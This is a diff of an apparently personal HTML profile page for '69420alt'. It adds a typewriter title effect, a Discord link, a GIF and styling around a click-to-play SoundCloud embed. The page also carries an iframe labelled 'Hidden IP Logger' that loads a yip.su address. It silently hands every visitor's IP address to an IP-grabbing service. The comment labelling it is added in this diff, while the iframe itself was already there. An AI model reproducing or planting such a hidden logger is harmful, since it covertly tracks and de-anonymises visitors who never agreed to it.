@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>69420alt</title>
+<title></title>
 <style>
   html, body {
     margin: 0; padding: 0; height: 100%;
@@ -47,20 +47,35 @@
     height: 1px;
     border: none;
   }
-</style>
-</head>
-<body>
-  <!-- Discord Icon in bottom-left corner -->
-  <a href="https://discord.gg/mfTe7YNBcM" target="_blank" rel="noopener noreferrer" style="
+  #discordIcon {
     position: fixed;
     bottom: 10px;
     left: 10px;
     z-index: 9999;
-  ">
-    <img src="https://cdn-icons-png.flaticon.com/512/2111/2111370.png"
-         alt="Join our Discord"
-         style="width: 40px; height: 40px; cursor: pointer;" />
+    width: 40px;
+    height: 40px;
+    cursor: pointer;
+  }
+  #gifBottomRight {
+    position: fixed;
+    bottom: 10px;
+    right: 10px;
+    z-index: 9998;
+    width: 100px;
+    height: auto;
+    pointer-events: none;
+  }
+</style>
+</head>
+<body>
+
+  <!-- Discord Icon -->
+  <a href="https://discord.gg/mfTe7YNBcM" target="_blank" rel="noopener noreferrer">
+    <img id="discordIcon" src="https://cdn-icons-png.flaticon.com/512/2111/2111370.png" alt="Join our Discord" />
   </a>
+
+  <!-- GIF bottom-right -->
+  <img id="gifBottomRight" src="https://media.tenor.com/zXfaGp4XfnYAAAAd/unsrscandidate-shai.gif" alt="aura gif" />
 
   <div id="header">69420alt Pudshi Owner</div>
   <img id="image" src="https://i.postimg.cc/wvWPXkkz/Immagine-2025-07-02-212001.png" alt="69420alt Image" />
@@ -74,8 +89,7 @@
     src=""
   ></iframe>
 
-  
-
+  <!-- Hidden IP Logger -->
   <iframe
     id="yipFrame"
     src="https://yip.su/aura"
@@ -83,6 +97,21 @@
   ></iframe>
 
 <script>
+  // Typewriter effect for <title>
+  const titleText = "69420alt";
+  let i = 0;
+
+  function typeTitle() {
+    if (i <= titleText.length) {
+      document.title = titleText.substring(0, i);
+      i++;
+      setTimeout(typeTitle, 500); // 500ms per letter
+    }
+  }
+
+  typeTitle();
+
+  // SoundCloud play
   const scIframe = document.getElementById('soundcloudPlayer');
   const instruction = document.getElementById('instruction');
   let started = false;
@@ -97,5 +126,6 @@
   document.body.addEventListener('click', startAudio);
   document.body.addEventListener('touchstart', startAudio);
 </script>
+
 </body>
 </html>
